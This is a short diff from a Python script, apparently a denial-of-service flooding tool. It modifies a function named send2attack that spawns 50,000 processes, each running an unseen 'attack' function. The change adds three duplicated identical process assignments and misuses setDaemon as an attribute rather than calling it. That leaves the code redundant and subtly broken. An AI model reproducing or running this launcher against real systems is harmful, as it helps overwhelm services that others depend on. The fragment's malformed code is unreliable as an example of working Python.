@@ -80,7 +80,10 @@ sleep(1)
 def send2attack():
   for i in range(50000): #Poder mágico
     mp = multiprocessing.Process(target=attack)
-    mp.setDaemon = False
+    mp = multiprocessing.Process(target=attack)
+    mp = multiprocessing.Process(target=attack)
+    mp = multiprocessing.Process(target=attack)
+    mp.setDaemon = True
     mp.start() #Magic Starts
 
     
